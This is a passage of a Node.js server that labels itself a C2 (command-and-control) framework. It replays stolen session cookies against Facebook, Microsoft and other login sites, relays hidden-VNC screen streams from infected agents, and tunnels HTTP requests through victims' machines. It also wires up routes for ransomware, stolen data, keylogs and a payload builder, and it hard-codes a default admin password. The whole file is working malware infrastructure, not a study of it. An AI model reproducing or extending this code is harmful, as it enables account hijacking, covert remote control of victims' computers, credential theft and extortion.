                    domain: '.facebook.com',
                    path: '/',
                    secure: true,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            },
            {
                name: 'Facebook Service',
                priority: 2,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: c.host || c.domain || `.${baseDomain}`,
                    path: c.path || '/',
                    secure: c.secure || false,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            }
        ];
    } else if (domain.includes('microsoft.com') || domain.includes('live.com') || domain.includes('outlook.com')) {
        plan.strategy = 'microsoft';
        plan.phases = [
            {
                name: 'Microsoft Auth',
                priority: 1,
                url: 'https://login.live.com',
                cookies: authCookies.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: '.live.com',
                    path: '/',
                    secure: true,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            },
            {
                name: 'Microsoft Service',
                priority: 2,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: c.host || c.domain || `.${baseDomain}`,
                    path: c.path || '/',
                    secure: c.secure || false,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            }
        ];
    } else {
        plan.strategy = 'generic';
        const loginDomains = ['login', 'auth', 'account', 'accounts', 'signin', 'secure'];
        let loginUrl = `https://${domain}`;
        const loginCookies = cookies.filter(c => {
            const host = (c.host || c.domain || '').toLowerCase();
            return loginDomains.some(d => host.includes(d));
        });
        if (loginCookies.length > 0) {
            const loginHost = loginCookies[0].host || loginCookies[0].domain;
            loginUrl = `https://${loginHost}`;
        }
        plan.phases = [
            {
                name: 'Authentication Cookies',
                priority: 1,
                url: loginUrl,
                cookies: authCookies.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: c.host || c.domain || `.${baseDomain}`,
                    path: c.path || '/',
                    secure: c.secure || false,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            },
            {
                name: 'Service Cookies',
                priority: 2,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: c.host || c.domain || `.${baseDomain}`,
                    path: c.path || '/',
                    secure: c.secure || false,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            }
        ];
    }
    return plan;
}

// ─── PROXY ROUTE ──────────────────────────────────────────────────
const agentSockets = new Map();

function getAgentSocket(agentId) {
    const socket = agentSockets.get(agentId);
    console.log(`[WebRTC] 🔍 Looking for agent ${agentId}: ${socket ? 'Found' : 'Not found'}`);
    console.log(`[WebRTC] 📋 Available agents:`, Array.from(agentSockets.keys()));
    return socket;
}

io.on('connection', (socket) => {
    console.log('[SOCKET] New connection:', socket.id);

    socket.on('register_agent', (data) => {
    const agentId = data.agentId;
    if (agentId) {
        agentSockets.set(agentId, socket);
        console.log(`[PROXY] Agent ${agentId} registered (socket: ${socket.id})`);
        // ─── Deliver any pending WebRTC answer ──────────────
        for (const [sessionId, session] of webrtcSessions) {
            if (session.agentId === agentId && session.pendingAnswer) {
                socket.emit('webrtc_answer', {
                    sessionId: sessionId,
                    sdp: session.pendingAnswer
                });
                console.log(`[WebRTC] 📤 Delivered pending answer to agent ${agentId}`);
                delete session.pendingAnswer;
            }
            // Also deliver pending ICE candidates
            if (session.agentId === agentId && session.iceCandidates && session.iceCandidates.length > 0) {
                for (const candidate of session.iceCandidates) {
                    socket.emit('webrtc_ice_candidate', {
                        sessionId: sessionId,
                        candidate: candidate.candidate
                    });
                }
                session.iceCandidates = [];
                console.log(`[WebRTC] 📤 Delivered ${session.iceCandidates.length} pending ICE candidates to agent ${agentId}`);
            }
        }
        // ──────────────────────────────────────────────────────
        socket.on('disconnect', () => {
            agentSockets.delete(agentId);
            console.log(`[PROXY] Agent ${agentId} unregistered`);
        });
    }
});

    socket.on('http_response', (data) => {
        const { requestId, status, headers, body } = data;
        const pending = pendingRequests.get(requestId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingRequests.delete(requestId);
            pending.resolve({ status, headers, body });
        }
    });

    socket.on('http_chunk', (data) => {
        const { requestId, chunk } = data;
        const pending = pendingRequests.get(requestId);
        if (pending && pending.onChunk) {
            pending.onChunk(chunk);
        }
    });

    socket.on('http_stream_end', (data) => {
        const { requestId } = data;
        const pending = pendingRequests.get(requestId);
        if (pending && pending.onEnd) {
            pending.onEnd();
        }
        pendingRequests.delete(requestId);
    });

    socket.on('http_stop_stream', (data) => {
        pendingRequests.delete(data.requestId);
    });

    // ─── HVNC Frame Handler ──────────────────────────────────────
    socket.on('hvnc_frame', (data) => {
        const { agentId, sessionId, width, height, data: frameData, timestamp, type, keyframe, seq, fps } = data;
        console.log(`[HVNC] 📥 Frame from ${agentId}, type: ${type || 'jpeg'}, size: ${frameData?.length || 0}, seq: ${seq || 0}`);
        
        if (!agentId) {
            console.warn('[HVNC] Frame without agentId');
            return;
        }
        
        hvncFrames.set(agentId, {
            frame: frameData,
            width: width || 1920,
            height: height || 1080,
            timestamp: timestamp || Date.now(),
            sessionId: sessionId || 'unknown',
            type: type || 'jpeg',
            keyframe: keyframe || false,
            seq: seq || 0,
            fps: fps || 0,
            lastUpdate: Date.now()
        });
        
        const frameCount = (hvncFrames.get(agentId)?.frameCount || 0) + 1;
        hvncFrames.get(agentId).frameCount = frameCount;
        
        if (frameCount % 10 === 0) {
            const stored = hvncFrames.get(agentId);
            console.log(`[HVNC] Frame ${frameCount} from ${agentId}: ${stored.width}x${stored.height} (${stored.type})`);
        }
        
        const viewers = hvncViewers.get(agentId) || new Set();
        let broadcastCount = 0;
        for (const viewerSocket of viewers) {
            if (viewerSocket.connected) {
                try {
                    viewerSocket.emit('hvnc_frame', {
                        agentId,
                        sessionId,
                        width,
                        height,
                        data: frameData,
                        timestamp,
                        type: type || 'jpeg',
                        keyframe: keyframe || false,
                        seq: seq || 0,
                        fps: fps || 0
                    });
                    broadcastCount++;
                } catch (err) {
                    console.error('[HVNC] Broadcast error:', err);
                    viewers.delete(viewerSocket);
                }
            } else {
                viewers.delete(viewerSocket);
            }
        }
        if (broadcastCount > 0 && broadcastCount % 10 === 0) {
            console.log(`[HVNC] Broadcast to ${broadcastCount} viewers for ${agentId}`);
        }
    });

    socket.on('hvnc_viewer', (data) => {
        const { agentId, sessionId } = data;
        if (!agentId) return;
        
        if (!hvncViewers.has(agentId)) {
            hvncViewers.set(agentId, new Set());
        }
        hvncViewers.get(agentId).add(socket);
        socket.hvncAgentId = agentId;
        socket.hvncSessionId = sessionId;
        console.log(`[HVNC] Viewer registered for ${agentId}`);
        
        const latest = hvncFrames.get(agentId);
        if (latest && latest.frame) {
            socket.emit('hvnc_frame', {
                agentId,
                sessionId: latest.sessionId,
                width: latest.width,
                height: latest.height,
                data: latest.frame,
                timestamp: latest.timestamp,
                type: latest.type || 'jpeg',
                keyframe: latest.keyframe || false,
                seq: latest.seq || 0,
                fps: latest.fps || 0
            });
            console.log(`[HVNC] Sent latest frame to viewer for ${agentId} (${latest.type})`);
        } else {
            console.log(`[HVNC] No frame available for ${agentId}`);
        }
    });




    // ─── WEBRTC SOCKET.IO EVENTS ────────────────────────────────────
socket.on('webrtc_offer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[WebRTC-SIO] Offer from agent for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    // Store offer
    session.offer = sdp;
    session.connected = true;
    
    // Forward to all connected viewers
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    console.log(`[WebRTC-SIO] Offer forwarded to ${forwardedCount} viewers`);
});

socket.on('webrtc_answer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[WebRTC-SIO] Answer from viewer for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    // Store answer
    session.answer = sdp;
    
    // Forward to agent via Socket.IO
    const agentSocket = getAgentSocket(session.agentId);
    if (agentSocket && agentSocket.connected) {
        agentSocket.emit('webrtc_answer', {
            sessionId: sessionId,
            sdp: sdp
        });
        console.log(`[WebRTC-SIO] Answer forwarded to agent ${session.agentId}`);
    } else {
        console.log(`[WebRTC-SIO] Agent ${session.agentId} not connected, storing answer`);
        session.pendingAnswer = sdp;
    }
});

socket.on('webrtc_ice_candidate', (data) => {
    const { sessionId, candidate, target } = data;
    console.log(`[WebRTC-SIO] ICE candidate for session ${sessionId} -> ${target}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    if (target === 'viewer') {
        // Forward to all viewers
        for (const viewer of session.viewers) {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'ice_candidate',
                    candidate: candidate,
                    sessionId: sessionId
                }));
            }
        }
    } else if (target === 'agent') {
        // Forward to agent
        const agentSocket = getAgentSocket(session.agentId);
        if (agentSocket && agentSocket.connected) {
            agentSocket.emit('webrtc_ice_candidate', {
                sessionId: sessionId,
                candidate: candidate
            });
        } else {
            session.iceCandidates.push({
                candidate: candidate,
                timestamp: Date.now()
            });
        }
    }
});




// ─── HVNC WebRTC Socket.IO Events ──────────────────────────────

// Agent sends HVNC WebRTC offer via Socket.IO
socket.on('hvnc_webrtc_offer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[HVNC WebRTC-SIO] Offer from agent for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[HVNC WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    session.offer = sdp;
    session.connected = true;
    
    // Forward to viewers
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    console.log(`[HVNC WebRTC-SIO] Offer forwarded to ${forwardedCount} viewers`);
});

// Viewer sends HVNC WebRTC answer
socket.on('hvnc_webrtc_answer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[HVNC WebRTC-SIO] Answer from viewer for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[HVNC WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    session.answer = sdp;
    
    // Forward to agent
    const agentSocket = getAgentSocket(session.agentId);
    if (agentSocket && agentSocket.connected) {
        agentSocket.emit('hvnc_webrtc_answer', {
            sessionId: sessionId,
            sdp: sdp
        });
        console.log(`[HVNC WebRTC-SIO] Answer forwarded to agent ${session.agentId}`);
    } else {
        session.pendingAnswer = sdp;
        console.log(`[HVNC WebRTC-SIO] Agent ${session.agentId} not connected, storing answer`);
    }
});

// ICE candidate exchange for HVNC WebRTC
socket.on('hvnc_webrtc_ice', (data) => {
    const { sessionId, candidate, target } = data;
    console.log(`[HVNC WebRTC-SIO] ICE candidate for session ${sessionId} -> ${target}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[HVNC WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    if (target === 'viewer') {
        for (const viewer of session.viewers) {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'ice_candidate',
                    candidate: candidate,
                    sessionId: sessionId
                }));
            }
        }
    } else if (target === 'agent') {
        const agentSocket = getAgentSocket(session.agentId);
        if (agentSocket && agentSocket.connected) {
            agentSocket.emit('hvnc_webrtc_ice', {
                sessionId: sessionId,
                candidate: candidate
            });
        } else {
            session.iceCandidates.push({
                candidate: candidate,
                timestamp: Date.now()
            });
        }
    }
});


    socket.on('hvnc_status', (data) => {
        console.log(`[HVNC] Status from ${data.agentId}: ${data.status}`);
    });

    socket.on('hvnc_command_response', (data) => {
        console.log(`[HVNC] Command response:`, data);
    });

    socket.on('disconnect', () => {
        if (socket.hvncAgentId) {
            const viewers = hvncViewers.get(socket.hvncAgentId);
            if (viewers) {
                viewers.delete(socket);
                if (viewers.size === 0) {
                    hvncViewers.delete(socket.hvncAgentId);
                }
            }
            console.log(`[HVNC] Viewer removed for ${socket.hvncAgentId}`);
        }
    });
});

const pendingRequests = new Map();

app.all('/api/hvnc/proxy/*', async (req, res) => {
    const agentId = req.query.agentId;
    if (!agentId) {
        return res.status(400).json({ error: 'Missing agentId' });
    }

    const socket = getAgentSocket(agentId);
    if (!socket) {
        return res.status(404).json({ error: 'Agent not connected' });
    }

    const requestId = `proxy_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const method = req.method;
    const path = req.params[0] || '';
    const headers = req.headers;
    delete headers.host;
    delete headers['content-length'];
    const body = req.body;
    const isStreaming = path === 'mjpeg';

    const message = {
        type: 'http_request',
        requestId,
        method,
        path: `/${path}`,
        headers,
        body: method !== 'GET' ? body : undefined,
        streaming: isStreaming
    };

    if (isStreaming) {
        const streamId = requestId;
        socket.emit('http_request', message);

        res.writeHead(200, {
            'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Connection': 'keep-alive',
            'Access-Control-Allow-Origin': '*',
            'Cross-Origin-Resource-Policy': 'cross-origin'
        });

        const streamPending = {
            onChunk: (chunkBase64) => {
                try {
                    const chunk = Buffer.from(chunkBase64, 'base64');
                    res.write(chunk);
                } catch (err) {
                    console.error('[Proxy] Chunk write error:', err);
                }
            },
            onEnd: () => {
                res.end();
                pendingRequests.delete(requestId);
            }
        };
        pendingRequests.set(requestId, streamPending);

        req.on('close', () => {
            socket.emit('http_stop_stream', { requestId: streamId });
            pendingRequests.delete(requestId);
        });

        let lastChunkTime = Date.now();
        const checkInterval = setInterval(() => {
            if (Date.now() - lastChunkTime > 60000) {
                clearInterval(checkInterval);
                res.end();
                pendingRequests.delete(requestId);
                socket.emit('http_stop_stream', { requestId: streamId });
            }
        }, 5000);

        const originalOnChunk = streamPending.onChunk;
        streamPending.onChunk = (chunkBase64) => {
            lastChunkTime = Date.now();
            originalOnChunk(chunkBase64);
        };

        return;
    }

    try {
        const response = await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                pendingRequests.delete(requestId);
                reject(new Error('Proxy request timed out'));
            }, 30000);

            pendingRequests.set(requestId, { resolve, reject, timer: timeout });
            socket.emit('http_request', message);
        });

        res.status(response.status).set(response.headers).send(response.body);
    } catch (err) {
        console.error('[Proxy] Error:', err.message);
        res.status(504).json({ error: 'Proxy request failed' });
    }
});

// ─── HVNC HTTP ENDPOINTS ────────────────────────────────────────
app.get('/api/hvnc/frame/:agentId', (req, res) => {
    const { agentId } = req.params;
    const frame = hvncFrames.get(agentId);
    if (frame && frame.frame) {
        const imgData = Buffer.from(frame.frame, 'base64');
        res.set('Content-Type', 'image/jpeg');
        res.send(imgData);
    } else {
        res.status(404).send('No frame');
    }
});

app.get('/api/hvnc/mjpeg/:agentId', (req, res) => {
    const { agentId } = req.params;
    console.log(`[MJPEG-HVNC] Request for agent: ${agentId}`);

    const socket = getAgentSocket(agentId);
    if (!socket) {
        console.log(`[MJPEG-HVNC] Agent ${agentId} not connected`);
        return res.status(404).send('Agent not connected');
    }

    const boundary = 'frame';
    res.writeHead(200, {
        'Content-Type': `multipart/x-mixed-replace; boundary=${boundary}`,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });

    let frameCount = 0;
    let isClosed = false;

    const sendFrame = () => {
        if (isClosed) return;
        const current = hvncFrames.get(agentId);
        if (current && current.frame) {
            try {
                if (current.type === 'h264') {
                    return;
                }
                
                const img = Buffer.from(current.frame, 'base64');
                if (img.length > 2 && img[0] === 0xFF && img[1] === 0xD8) {
                    res.write(`--${boundary}\r\n`);
                    res.write('Content-Type: image/jpeg\r\n');
                    res.write(`Content-Length: ${img.length}\r\n\r\n`);
                    res.write(img);
                    res.write('\r\n');
                    frameCount++;
                    if (frameCount % 10 === 0) {
                        console.log(`[MJPEG-HVNC] Sent ${frameCount} frames for ${agentId}`);
                    }
                } else {
                    console.warn('[MJPEG-HVNC] Invalid JPEG for agent', agentId);
                }
            } catch (err) {
                console.error('[MJPEG-HVNC] Send error:', err);
                clearInterval(interval);
                if (!isClosed) {
                    res.end();
                    isClosed = true;
                }
            }
        }
    };

    const interval = setInterval(sendFrame, 100);
    req.on('close', () => {
        isClosed = true;
        clearInterval(interval);
        console.log(`[MJPEG-HVNC] Stream closed for ${agentId} (${frameCount} frames)`);
    });
});

app.get('/api/hvnc/debug/:agentId', (req, res) => {
    const { agentId } = req.params;
    const frame = hvncFrames.get(agentId);
    if (frame) {
        res.json({
            agentId,
            hasFrame: true,
            width: frame.width,
            height: frame.height,
            timestamp: frame.timestamp,
            frameDataLength: frame.frame?.length || 0
        });
    } else {
        res.json({ agentId, hasFrame: false });
    }
});

app.get('/api/hvnc/viewer/:agentId', (req, res) => {
    const { agentId } = req.params;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>HVNC Viewer</title></head>
        <body style="margin:0;background:#000;">
            <img src="/api/hvnc/mjpeg/${agentId}" style="width:100%;height:100%;object-fit:contain;" />
        </body>
        </html>
    `);
});

// ------------------------------------------------------------
// STATUS ROUTES
// ------------------------------------------------------------
app.get('/api/rdp/status', (req, res) => {
    const isMjpegActive = mjpegState.frame !== null && (Date.now() - mjpegState.lastUpdate < 5000);
    res.json({
        rdpRunning: rdpProcess !== null,
        rdpPort: 9000,
        hvncRunning: hvncProcess !== null,
        hvncPort: 1080,
        mjpegRunning: isMjpegActive,
        mjpegStreams: mjpegState.frame !== null ? 1 : 0,
        mjpegPort: 3000
    });
});

app.get('/api/hvnc/status', (req, res) => {
    const isRunning = hvncProcess !== null && hvncProcess.pid !== undefined;
    res.json({
        running: isRunning,
        pid: isRunning ? hvncProcess.pid : null,
        port: 1080
    });
});

app.post('/api/hvnc/stop', (req, res) => {
    const result = stopHVNCServer();
    res.json({
        success: result,
        message: result ? 'HVNC server stopped' : 'No HVNC server running'
    });
});

app.post('/api/hvnc/start', (req, res) => {
    const process = startHVNCServer();
    res.json({
        success: process !== null,
        message: process ? 'HVNC server started' : 'Failed to start HVNC server',
        pid: process ? process.pid : null
    });
});

// ------------------------------------------------------------
// ROUTES
// ------------------------------------------------------------

app.get('/api/admin/users', verifyToken, requireAdmin, async (req, res) => {});
app.use('/api/auth', authRoutes);
app.use('/api/agents', verifyToken, agentRoutes);
app.use('/api/tasks', verifyToken, taskRoutes);
app.use('/api/modules', verifyToken, moduleRoutes);
app.use('/api/ransomware', ransomwareRoutes);
app.use('/api/stolen', verifyToken, stolenRoutes);
app.use('/api/keylogs', verifyToken, keylogsRoutes);
app.use('/api/build', builderRoutes);

app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date(), database: 'SQLite' });
});

require('./socket')(io);

// ------------------------------------------------------------
// CREATE DEFAULT ADMIN USER
// ------------------------------------------------------------
const createAdminUser = async () => {
    try {
        const bcrypt = require('bcrypt');
        const crypto = require('crypto');
        const db = require('./database');

        db.get('SELECT * FROM users WHERE username = ?', ['admin'], async (err, admin) => {
            if (err) {
                console.error('Error checking admin:', err);
                return;
            }
            if (!admin) {
                const hashedPassword = await bcrypt.hash('Damiboy1234', 10);
                const apiKey = crypto.randomBytes(32).toString('hex');
                db.run(
                    'INSERT INTO users (username, password, role, apiKey) VALUES (?, ?, ?, ?)',
                    ['admin', hashedPassword, 'admin', apiKey],
                    (err) => {
                        if (err) {
                            console.error('Error creating admin:', err);
                        } else {
                            console.log('✅ Default admin created: admin/admin123');
                            console.log('⚠️ IMPORTANT: Change this password immediately!');
                        }
                    }
                );
            } else {
                console.log('✅ Admin user already exists');
            }
        });
    } catch (err) {
        console.error('Error creating admin:', err.message);
    }
};

startCleanupJob();
// ------------------------------------------------------------
// START THE SERVERS
// ------------------------------------------------------------
const PORT = process.env.PORT || 3000;
const WEBRTC_PORT = process.env.WEBRTC_PORT || 8082;

// ─── START MAIN HTTP SERVER ──────────────────────────────────────
server.listen(PORT, () => {
    console.log(`🚀 C2 Server running on port ${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}`);
    console.log(`💾 Database: SQLite (c2_framework.db)`);
    console.log(`📁 Static files served from: ${path.join(__dirname, '..', '..', 'www')}`);
    console.log(`📦 Payloads served from: ${path.join(__dirname, 'payloads')}`);
    
    startRdpLocalServer();
    startHVNCServer();

    console.log('\n📋 All servers started:');
    console.log(`   🔹 C2 API: http://localhost:${PORT}`);
    console.log(`   🔹 RDP Viewer: http://localhost:9000`);
    console.log(`   🔹 WebRTC Signaling: ws://localhost:${WEBRTC_PORT}`);
    console.log(`   🔹 WebRTC API: http://localhost:${PORT}/api/webrtc/status`);
    console.log(`   🔹 HVNC (legacy): http://localhost:1080`);
    console.log(`   🔹 MJPEG Relay: http://localhost:${PORT}/api/mjpeg/stream`);
    console.log(`   🔹 MJPEG Status: http://localhost:${PORT}/api/mjpeg/status`);
    console.log(`   🔹 MJPEG Killswitch: POST /api/mjpeg/killall`);
    console.log(`   🔹 HVNC MJPEG: http://localhost:${PORT}/api/hvnc/mjpeg/:agentId`);
    console.log(`   🔹 HVNC Test Viewer: http://localhost:${PORT}/api/hvnc/viewer/:agentId`);
    console.log(`   🔹 TCP Signaling (for HVNC client): port 9001`);
});

// ─── START WEBRTC WEBSOCKET SERVER ──────────────────────────────
// ─── START WEBRTC WEBSOCKET SERVER ──────────────────────────────
webRTCServer.listen(WEBRTC_PORT, '127.0.0.1', () => {
    console.log(`[WebRTC] WebSocket signaling server running on ws://127.0.0.1:${WEBRTC_PORT}`);
});

webRTCServer.on('error', (err) => {
    console.error('[WebRTC] Server error:', err);
    if (err.code === 'EADDRINUSE') {
        console.error(`[WebRTC] Port ${WEBRTC_PORT} is already in use. Kill the old process or change WEBRTC_PORT.`);
        process.exit(1);  // fail loudly instead of silently moving ports
    }
});

// ─── GRACEFUL SHUTDOWN ───────────────────────────────────────────
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT. Shutting down...');
    
    // Clean up WebRTC sessions
    for (const [sessionId, session] of webrtcSessions) {
        try {
            for (const viewer of session.viewers) {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close();
                }
            }
        } catch (e) {}
    }
    webrtcSessions.clear();
    
    stopRdpServer();
    stopHVNCServer();
    webRTCServer.close();
    server.close(() => {
        console.log('✅ All servers shut down gracefully');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n🛑 Received SIGTERM. Shutting down...');
    
    // Clean up WebRTC sessions
    for (const [sessionId, session] of webrtcSessions) {
        try {
            for (const viewer of session.viewers) {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close();
                }
            }
        } catch (e) {}
    }
    webrtcSessions.clear();
    
    stopRdpServer();
    stopHVNCServer();
    webRTCServer.close();
    server.close(() => {
        console.log('✅ All servers shut down gracefully');
        process.exit(0);
    });
});

module.exports = { app, server, io };